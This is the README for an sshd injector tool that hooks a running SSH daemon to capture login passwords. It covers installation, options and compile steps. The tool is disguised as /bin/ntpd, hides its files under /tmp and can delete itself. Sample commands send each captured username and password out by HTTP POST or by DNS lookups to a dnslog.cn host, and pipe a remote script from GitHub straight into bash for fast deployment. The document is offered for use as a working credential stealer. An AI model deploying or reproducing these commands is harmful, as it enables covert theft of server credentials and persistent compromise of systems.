# what's this?

SSHD injector, and then you can record passwords or do other operations.

Need to close selinux

English | [中文文档](readme_cn.md)

# how to use

## auto installer

One universal installer with auto architecture detection (x86_64 / aarch64), all sources are embedded and compiled on the target.

Run:
```
bash install.sh
```

Login with ssh password after running，The password record address is /tmp/.password.txt. The evil so path is /tmp/.g.so，the injector path is /bin/ntpd.

The installer automatically runs: environment pre-check (root / glibc / PAM / SELinux / ptrace) -> sshd pid detection (systemd aware) -> on-site compilation -> launch self-check.

Other parameters (both `-x value` and `--long=value` forms are supported):
```
    -s, --sshd-pid    Manually specify the sshd listener pid (usually auto-detected; use this if detection fails or picks the wrong one)
    -e, --evil-so     Custom evil so path, default /tmp/.g.so
    -o, --output      Custom injector path, default /bin/ntpd
    -m, --mode        0 = output to file (/tmp/.password.txt), 1 = command execution mode
    -p, --payload     Custom payload, default /tmp/.password.txt; in mode 1 it is a command template and must contain two %s (username / password)
    -d, --delete      Auto delete: `anyone` = delete once any password is captured, otherwise delete when the given username matches
    -l, --libc        Substring used to match libc in /proc/pid/maps, default auto (libc-xxxx.so then libc.so.x)
        --status      Show injector runtime status
        --uninstall   Stop the injector and remove all files
        --keep-build  Keep the build temp directory (debug)
    -h, --help        Help
```

Note: no escaping (e.g. `&`) is needed inside payloads.

## samples

http send password
```
bash install.sh -p "curl -X POST -d 'username=%s&password=%s' --connect-timeout 1 -m 1 http://127.0.0.1" -m 1
```

dns send password and self-delete (Please make sure that your command is not blocked, because the actual use of this program is that the system is an online program, if the command is blocked, it will cause the ssh login program to be blocked)
```
bash install.sh -p 'ping `echo %s-%s|xxd -ps`.k9lovy.dnslog.cn -c 1' -m 1 -d anyone
```

Fast remote automatic deployment and self-delete for If any user login succeeds
```
curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.4/sshdHooker.sh | bash -s -- -d anyone
```

Fast remote automatic deployment and used by http send password and self-delete for If any user login succeeds (*Recommend*)
```
curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.4/sshdHooker.sh | bash -s -- -p "curl -X POST -d 'username=%s&password=%s' --connect-timeout 1 -m 1 http://127.0.0.1" -m 1 -d anyone
```

Post-install management
```
bash install.sh --status      # show injector status and log
bash install.sh --uninstall   # stop injector and remove all files
```

## compatibility

- Verified: Debian 12/13, Ubuntu 22.04/24.04, Rocky/RHEL/CentOS 8/9 (aarch64 containers and a real x86_64 machine, OpenSSH 8.0 ~ 10.0)
- Requirements: glibc, sshd with PAM (pam_unix password auth), SELinux not enforcing, root, gcc on the target
- Not applicable: musl (e.g. Alpine where sshd has no PAM), pubkey-only auth, auth stacks without pam_unix

## regenerate the installer from sources

The installer is packed from the repo sources (`x86_64/` and `arm/` are the single source of truth, do not edit `install.sh` directly):
```
tools/mkinstaller.sh
```

## debug

use
```

gcc -shared inject_got.c -ldl -fPIC -o test2.so -std=c99

mv test2.so /tmp/hello.so

gcc sshdHooker.c shellcode.s -g -o inject -ldl -lpthread

sudo ./inject sshd_pid
```


# todo

 - add x86/arm support
 - bypass SELINUX
